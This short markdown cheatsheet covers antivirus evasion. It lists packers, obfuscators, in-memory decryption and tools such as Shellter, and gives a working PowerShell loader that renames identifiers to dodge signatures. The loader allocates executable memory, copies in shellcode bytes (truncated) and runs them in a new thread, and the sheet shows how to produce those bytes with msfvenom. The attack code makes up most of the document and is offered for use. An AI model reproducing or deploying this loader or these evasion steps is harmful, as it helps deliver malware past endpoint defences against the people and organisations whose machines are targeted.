# AV bypass cheatsheet

Sometime it is needed to use some binary but it gets blocke by AV. What to do? Just by pass it..

AV uses static and dynamic methods to detect malware, but we are not malware. So lets think about this.

Test on `antiscan.me`

## Basics

* dump binary 

`xxd -b file.txt`

* dump strings 

`strings file.txt`

### High level list of methods

* packers
* obfuscators (incl. run in memory)
* encryption and in-memory decryption (most effective)
* Tooks: The Enigma Protector

## Thread injection

### Manual

* in-memory injection in powershell script

```powershell

# replacing some well known variable and function names

$var2 = Add-Type -memberDefinition $code -Name "iWin32" -namespace Win32Functions -passthru;

#shell code 
[Byte[]];   
[Byte[]] $var1 = 0xfc,0xe8,0x8f,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28
...

$size = 0x1000;

if ($var1.Length -gt 0x1000) {$size = $var1.Length};

$x = $var2::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($var1.Length-1);$i++) {$var2::memset([IntPtr]($x.ToInt32()+$i), $var1[$i], 1)};

$var2::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };

```

* generate payload using msfvenom

```bash

msfvenom -p ... -f powershell -v sc

# past hex bytes into script

```

### Shellter

Paid program to automate the obfuscation process
